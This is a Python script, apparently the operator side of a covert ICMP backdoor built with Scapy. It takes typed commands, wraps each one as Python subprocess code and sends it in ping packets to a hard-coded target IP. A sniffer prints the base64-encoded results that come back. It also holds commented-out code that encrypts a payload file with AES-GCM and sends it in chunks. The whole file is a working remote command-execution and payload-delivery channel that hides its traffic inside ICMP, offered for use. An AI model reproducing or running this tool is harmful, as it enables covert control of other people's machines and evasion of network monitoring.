import logging
import os
import threading
import time
from time import sleep

from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from prompt_toolkit import PromptSession, print_formatted_text, prompt
from prompt_toolkit.patch_stdout import patch_stdout
from scapy.all import *

session = PromptSession()

# WARN: removes the MAC address not found etc ...
# silence only Scapy‐runtime warnings (leave other logs intact)
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # or logging.CRITICAL

# message codes
MAX_MESSAGE_SIZE = 40
RESEND_MESSAGE_CODE = 9
CHUNK_MESSAGE_CODE = 3
CONTROL_MESSAGE_CODE = 1
FINISH_CODE = 2

DELIMITER = "\00"
FILLER_STRING = "\01"

target = "10.0.0.194"
target = "192.168.0.59"

# fil = f"src host {target} and icmp"

fil = "icmp"
full_chunks = {}
icmp_seq = 1

with open("aes_key.bin", "rb") as key_file:
    symkey = key_file.read()


def sniff_icmp():
    def handle_recv(packet):
        if packet[ICMP].type == 0:
            return

        try:
            print(base64.b64decode(packet[Raw].load).decode())
        except Exception:
            pass
        # regular icmp reply
        # print(packet)
        # return
        # if packet[ICMP].type == 0:
        #     return

        # print("packet recieved")
        # try:
        #     print(packet.show())
        # except Exception:
        #     pass
        # return
        # try:
        #     packet_recv_data = packet[Raw].load.decode()
        #     print(packet_recv_data)
        #     message_data, extra = packet_recv_data.split(DELIMITER, 1)
        #     message_code = int(message_data[0])
        #     if message_code == RESEND_MESSAGE_CODE:
        #         chunk_id = int(message_data[1:])
        #         print(f"Recieved resend packet for chunk {chunk_id}")
        #         send_icmp(full_chunks[chunk_id])
        #     else:
        #         print_formatted_text("No code message recieved:", packet[Raw].load)
        # except Exception:
        #     print("exception caused")
        #     return

    sniff(filter=fil, prn=handle_recv, iface="wlp0s20f3")


def get_payload_chunks() -> list[bytes]:
    with open("payload_code.py", "r") as f:
        payload = f.read()
        encrypted_payload = encrypt_payload(payload)
        chunks = []
        chunk_index = 0
        i = 0
        # splits chunks into 40 bytes including the pre data headers
        while True:
            pre_data = f"{CHUNK_MESSAGE_CODE}{chunk_index}{DELIMITER}"
            true_size = MAX_MESSAGE_SIZE - len(pre_data)
            chunk = encrypted_payload[i : i + true_size]
            final_chunk = pre_data.encode() + chunk
            print(chunk)
            if chunk == b"":
                break
            chunks.append(final_chunk)
            full_chunks[chunk_index] = final_chunk
            i += true_size
            chunk_index += 1
        return chunks


def send_icmp(data: bytes):
    global icmp_seq

    # the id comes from the current process id and doing a Internet checksum (used to identify the "session" or "process" sending the ping)
    icmp_id = os.getpid() & 0xFFFF
    # seq increments per sent packet, helps detect packet loss, track individual requests

    icmp_packet = IP(dst=target) / ICMP(id=icmp_id, seq=icmp_seq) / Raw(load=data)

    resp = sr1(icmp_packet, verbose=0, timeout=3)

    icmp_seq += 1
    if resp:
        return resp
    else:
        return None


def encrypt_payload(data: str) -> bytes:
    aesgcm = AESGCM(symkey)
    nonce = os.urandom(12)
    ciphertext = aesgcm.encrypt(nonce, data.encode(), associated_data=None)
    complete_ciphertext = nonce + ciphertext
    return complete_ciphertext


# [1 message_type][x chunk_index][x total_chunks][x encrypted_payload_chunk] : Total 40

test = 0


def handle_message():
    global test
    # WARN: get_payload_chunks must be called to initialize the full_chunks dict
    # payload_chunks = get_payload_chunks()

    # # send the amount of chunks to expect
    # chunks_amount_payload = f"{CONTROL_MESSAGE_CODE}{len(payload_chunks)}{DELIMITER}"
    # send_chunk_size_resp = send_icmp(
    #     f"{chunks_amount_payload}{(MAX_MESSAGE_SIZE - len(chunks_amount_payload)) * FILLER_STRING}".encode()
    # )

    # # send chunks
    # for chunk in payload_chunks:
    #     # if test == 0:
    #     #     test += 1
    #     #     continue
    #     resp = send_icmp(chunk)
    #     if resp is not None:
    #         print(resp)
    #     else:
    #         print("packet lost")

    # time.sleep(2)

    # # send that it has finished sending all chunks
    # finish_payload = f"{FINISH_CODE}{DELIMITER}"
    # send_finish_resp = send_icmp(
    #     f"{finish_payload}{(MAX_MESSAGE_SIZE - len(finish_payload)) * FILLER_STRING}".encode()
    # )

    # another option, send cli commands through icmp

    while True:
        data = session.prompt(">")
        cmd_string = f"000import subprocess;result = subprocess.run({data.split(' ')}, capture_output=True, text=True);print(result.stdout);"
        send_icmp(cmd_string.encode())


sniffing_thread = threading.Thread(target=sniff_icmp, daemon=True)
message_thread = threading.Thread(target=handle_message)
sniffing_thread.start()
message_thread.start()

sniffing_thread.join()
